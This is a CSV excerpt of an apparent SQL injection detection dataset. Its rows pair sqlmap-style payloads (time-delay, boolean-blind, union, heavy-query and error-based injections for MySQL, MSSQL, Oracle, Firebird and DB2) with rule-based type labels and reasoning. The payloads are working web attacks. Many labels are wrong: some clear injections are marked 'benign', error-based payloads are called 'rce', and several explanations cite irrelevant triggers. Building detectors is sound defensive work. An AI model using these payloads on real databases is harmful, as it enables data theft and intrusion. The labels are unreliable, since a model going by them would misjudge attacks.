row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
7110,-3634%' ) ) or 2671 = 2434,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
7111,"1"" ) ) and sleep ( 5 ) and ( ( ""lied"" like ""lied",1,,time_blind,mysql,0.95,"sleep (, and sleep is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
7112,"1' in boolean mode ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) #",1,,heavy_query,generic,0.95,"select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers detected — heavy_query injection (priority 6) on generic",rule-based
7113,1'+ ( select xruo where 5709 = 5709 and 7533 = 7533 ) +',1,,boolean_blind,generic,0.95,5709 = 5709 and detected — boolean_blind injection (priority 8) on generic,rule-based
7114,"1' ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( 'zjel' like 'zjel",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
7115,select case when 4488 = 5522 then 1 else null end--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
7116,-3059' ) as jhbh where 4056 = 4056 or ( 3498 = 6965 ) *6965--,1,,boolean_blind,generic,0.95,4056 = 4056 or detected — boolean_blind injection (priority 8) on generic,rule-based
7117,"-1639 ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( 3318 = 3318",1,,error_based,oracle,0.95,ctxsys detected — error_based injection (priority 4) on oracle,rule-based
7118,"1"" or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers detected — heavy_query injection (priority 6) on generic",rule-based
7119,"-4885 union all select 4589,4589,4589,4589,4589,4589,4589,4589,4589,4589#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
7120,"1"" ) ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( ""ycuo"" like ""ycuo",1,,boolean_blind,firebird,0.95,") and (, like "" detected — boolean_blind injection (priority 8) on firebird",rule-based
7121,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3# sfup",1,,heavy_query,db2,0.95,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm detected — heavy_query injection (priority 6) on db2",rule-based
7122,"1' ) ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( ( 'sqzl' = 'sqzl",1,,rce,generic,0.95,0x694a4745 detected — rce injection (priority 1) on generic,rule-based
7123,"1 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) -- tzry",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
7124,"1%"" ) ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ""%"" = """,1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
7125,"1"" where 1537 = 1537 and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",1,,rce,mysql,0.95,0x7171706a71 detected — rce injection (priority 1) on mysql,rule-based
7126,1 ) and ( 2342 = 3620 ) *3620,1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
7127,"1' and elt ( 3247 = 3969,3969 ) and 'xcbm' like 'xcbm",1,,boolean_blind,generic,0.95,like ' detected — boolean_blind injection (priority 8) on generic,rule-based
7128,1 ) where 1100 = 1100 and sleep ( 5 ) --,1,,time_blind,mysql,0.95,"sleep (, and sleep is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
7129,"1%"" ) ) ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ( ""%"" = """,1,,heavy_query,generic,0.95,"generate_series (, select count ( * ) from generate_series ( 1,5000000 detected — heavy_query injection (priority 6) on generic",rule-based
7130,"1'+ ( select 'epza' where 8994 = 8994 and make_set ( 3782 = 2428,2428 ) ) +'",1,,boolean_blind,generic,0.95,8994 = 8994 and detected — boolean_blind injection (priority 8) on generic,rule-based
7131,"1"" ) ) and 9198 = 9198--",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
7132,"1'+ ( select eztr where 4260 = 4260 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) ) +'",1,,boolean_blind,generic,0.95,4260 = 4260 and detected — boolean_blind injection (priority 8) on generic,rule-based
7133,"1' ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( 'ireg' like 'ireg",1,,heavy_query,generic,0.95,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users detected — heavy_query injection (priority 6) on generic",rule-based
7134,select ( case when ( 2294 = 3651 ) then 2294 else 2294* ( select 2294 from information_schema.character_sets ) end ) #,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
7135,waitfor delay '0:0:5' and ( ( ( 'ywnm' = 'ywnm,1,,time_blind,mssql,0.95,waitfor delay is MSSQL-specific time-delay function — time-based blind inference (priority 5),rule-based
7136,"-8976%"" ) ) ) union all select 5146,5146,5146,5146,5146,5146,5146,5146--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
7137,"1%' ) ) union all select null,null,null,null,null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
7138,"-8331' ) union all select 1452,1452,1452,1452,1452--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
7139,"1"" ) ) as dooi where 1806 = 1806 and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,,heavy_query,firebird,0.95,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb detected — heavy_query injection (priority 6) on firebird",rule-based
